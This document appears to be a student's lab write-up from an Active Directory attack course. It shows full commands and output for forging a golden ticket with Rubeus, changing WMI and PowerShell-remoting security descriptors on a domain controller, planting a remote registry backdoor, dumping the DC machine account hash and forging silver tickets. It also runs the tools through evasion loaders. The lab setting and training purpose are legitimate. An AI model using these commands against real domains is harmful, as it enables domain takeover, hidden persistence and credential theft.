# Learning Objective 13

## Tasks

1. **Modify security descriptors on `dcorp-dc` to get access using PowerShell remoting and WMI without requiring administrator access**
2. **Retrieve machine account hash from `dcorp-dc` without using administrator access and use that to execute a silver ticket attack to get code execution with WMI**

---

## Solution

1. **Modify security descriptors on `dcorp-dc` to get access using PowerShell remoting and WMI without requiring administrator access**

Once we have administrative privileges on a machine, **we can modify security descriptors of services to access the services without administrative privileges**.

Below command (**to be run as domain administrator**, see *Learning Objective 08*) modifies the host security descriptors for WMI on the DC to allow `student422` access to WMI.

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt`:
```
[SNIP]

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt📌
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local'

[*] AuthTime       : 2/13/2025 1:39:41 AM
[*] StartTime      : 2/13/2025 1:39:41 AM
[*] EndTime        : 2/13/2025 11:39:41 AM
[*] RenewTill      : 2/20/2025 1:39:41 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x848dc4

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 2/13/2025 1:39:41 (local)
        End Time:   2/13/2025 11:39:41 (local)
        Renew Time: 2/20/2025 1:39:41 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`. C:\AD\Tools\RACE.ps1`

`Set-RemoteWMI -SamAccountName student422 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose`:
```
VERBOSE: Existing ACL for namespace root\cimv2 is
O:BAG:BAD:(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719
815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLC
SWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917
688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-
719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CIID;C
CDCLCSWRPWPRCWD;;;BA)(A;CIID;CCDCRP;;;NS)(A;CIID;CCDCRP;;;LS)(A;CIID;CCDCRP;;;AU)
VERBOSE: Existing ACL for DCOM is
O:BAG:BAD:(A;;CCDCLCSWRP;;;BA)(A;;CCDCSW;;;WD)(A;;CCDCLCSWRP;;;S-1-5-32-562)(A;;CCDCLCSWRP;;;LU)(A;;CCDCSW;;;AC)(A;;CCD
CSW;;;S-1-15-3-1024-2405443489-874036122-4286035555-1823921565-1746547431-2453885448-3625952902-991631256)(A;;CCDCLCSWR
P;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;;CCDCLCSWRP;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;;
CCDCLCSWRP;;;S-1-5-21-719815819-3726368948-3917688648-20607)
VERBOSE: New ACL for namespace root\cimv2 is
O:BAG:BAD:(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719
815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLC
SWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917
688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-
719815819-3726368948-3917688648-20607)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;CIID;C
CDCLCSWRPWPRCWD;;;BA)(A;CIID;CCDCRP;;;NS)(A;CIID;CCDCRP;;;LS)(A;CIID;CCDCRP;;;AU)(A;CI;CCDCLCSWRPWPRCWD;;;S-1-5-21-7198
15819-3726368948-3917688648-20607)
VERBOSE: New ACL for DCOM
O:BAG:BAD:(A;;CCDCLCSWRP;;;BA)(A;;CCDCSW;;;WD)(A;;CCDCLCSWRP;;;S-1-5-32-562)(A;;CCDCLCSWRP;;;LU)(A;;CCDCSW;;;AC)(A;;CCD
CSW;;;S-1-15-3-1024-2405443489-874036122-4286035555-1823921565-1746547431-2453885448-3625952902-991631256)(A;;CCDCLCSWR
P;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;;CCDCLCSWRP;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;;
CCDCLCSWRP;;;S-1-5-21-719815819-3726368948-3917688648-20607)(A;;CCDCLCSWRP;;;S-1-5-21-719815819-3726368948-3917688648-2
0607)
```

`exit`

Now, we can execute WMI queries on the DC as `student422`.

![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`gwmi -class win32_operatingsystem -ComputerName dcorp-dc`:
```
SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 20348
RegisteredUser  : Windows User
SerialNumber    : 00454-30000-00000-AA745
Version         : 10.0.20348
```

Similar modification can be done to **PowerShell remoting configuration**.

In rare cases, you may get an *I/O error* while using the below command, please ignore it. **Please note that this is unstable since some patches in August 2020**.

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt`:
```
[SNIP]

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt📌
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local'

[*] AuthTime       : 2/13/2025 1:39:41 AM
[*] StartTime      : 2/13/2025 1:39:41 AM
[*] EndTime        : 2/13/2025 11:39:41 AM
[*] RenewTill      : 2/20/2025 1:39:41 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x848dc4

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 2/13/2025 1:39:41 (local)
        End Time:   2/13/2025 11:39:41 (local)
        Renew Time: 2/20/2025 1:39:41 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`. C:\AD\Tools\RACE.ps1`

`Set-RemotePSRemoting -SamAccountName student422 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose`:
```
[dcorp-dc.dollarcorp.moneycorp.local] Processing data from remote server dcorp-dc.dollarcorp.moneycorp.local failed
with the following error message: The I/O operation has been aborted because of either a thread exit or an application
request. For more information, see the about_Remote_Troubleshooting Help topic.
    + CategoryInfo          : OpenError: (dcorp-dc.dollarcorp.moneycorp.local:String) [], PSRemotingTransportException
    + FullyQualifiedErrorId : WinRMOperationAborted,PSSessionStateBroken
```
❌

Now, we can run commands using PowerShell remoting on the DC without DA privileges.

![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local`:
```
student422
```
🚩

2. **Retrieve machine account hash from `dcorp-dc` without using administrator access and use that to execute a silver ticket attack to get code execution with WMI**

To retrieve machine account hash without DA, first we need to modify permissions on the DC.
Run the below command **as DA**.

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`klist`:
```
Current LogonId is 0:0x848dc4

Cached Tickets: (0)
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt`:
```
[SNIP]

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt📌
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local'

[*] AuthTime       : 2/13/2025 1:39:41 AM
[*] StartTime      : 2/13/2025 1:39:41 AM
[*] EndTime        : 2/13/2025 11:39:41 AM
[*] RenewTill      : 2/20/2025 1:39:41 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x848dc4

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 2/13/2025 1:39:41 (local)
        End Time:   2/13/2025 11:39:41 (local)
        Renew Time: 2/20/2025 1:39:41 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`. C:\AD\Tools\RACE.ps1`

`Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student422 -Verbose`:
```
[SNIP]

VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SAM\SAM\Domains\Account] Calling SetSecurityDescriptor on the key with
the newly created Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SAM\SAM\Domains\Account] Backdooring completed for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local] Backdooring completed for system

ComputerName                        BackdoorTrustee
------------                        ---------------
dcorp-dc.dollarcorp.moneycorp.local student422📌
```

Now, we can retrieve hash as `student422`.

![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`. C:\AD\Tools\RACE.ps1`

`Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose`:
```
VERBOSE: Bootkey/SysKey : BAB78ACD91795C983AEF0534E0DB38C7
VERBOSE: LSA Key        : BDC807FEC0BB38EB0AE338451573904220F8B69404F719BDDB03F8618E84005C

ComputerName MachineAccountHash
------------ ------------------
dcorp-dc🔑   68d6c096c7cfee52a45d6207489526bc🔑
```

We can use the machine account hash to create silver tickets. Create silver tickets for **HOST** and **RPCSS** using the machine account hash to execute WMI queries.

![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:68d6c096c7cfee52a45d6207489526bc /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt`:
```
[SNIP]

[*] Action: Build TGS

[SNIP]

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 68D6C096C7CFEE52A45D6207489526BC
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 68D6C096C7CFEE52A45D6207489526BC
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : host📌
[*] Target         : dcorp-dc.dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'Administrator'🎭 to 'host/dcorp-dc.dollarcorp.moneycorp.local'

[*] AuthTime       : 2/14/2025 6:51:24 AM
[*] StartTime      : 2/14/2025 6:51:24 AM
[*] EndTime        : 2/14/2025 4:51:24 PM
[*] RenewTill      : 2/21/2025 6:51:24 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:1be12164a06b817e834eb437dc8f581c /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt`:
```
[SNIP]

[*] Action: Build TGS

[SNIP]

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 1BE12164A06B817E834EB437DC8F581C
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 1BE12164A06B817E834EB437DC8F581C
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : rpcss📌
[*] Target         : dcorp-dc.dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'Administrator'🎭 to 'rpcss/dcorp-dc.dollarcorp.moneycorp.local'

[*] AuthTime       : 2/14/2025 6:54:32 AM
[*] StartTime      : 2/14/2025 6:54:32 AM
[*] EndTime        : 2/14/2025 4:54:32 PM
[*] RenewTill      : 2/21/2025 6:54:32 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x38c010

Cached Tickets: (2)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: rpcss📌/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 2/14/2025 7:16:43 (local)
        End Time:   2/14/2025 17:16:43 (local)
        Renew Time: 2/21/2025 7:16:43 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

#1>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: host📌/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 2/14/2025 7:16:16 (local)
        End Time:   2/14/2025 17:16:16 (local)
        Renew Time: 2/21/2025 7:16:16 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

Run the below command.

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`gwmi -Class win32_operatingsystem -ComputerName dcorp-dc`:
```
SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 20348
RegisteredUser  : Windows User
SerialNumber    : 00454-30000-00000-AA745
Version         : 10.0.20348
```
🚩

---
---
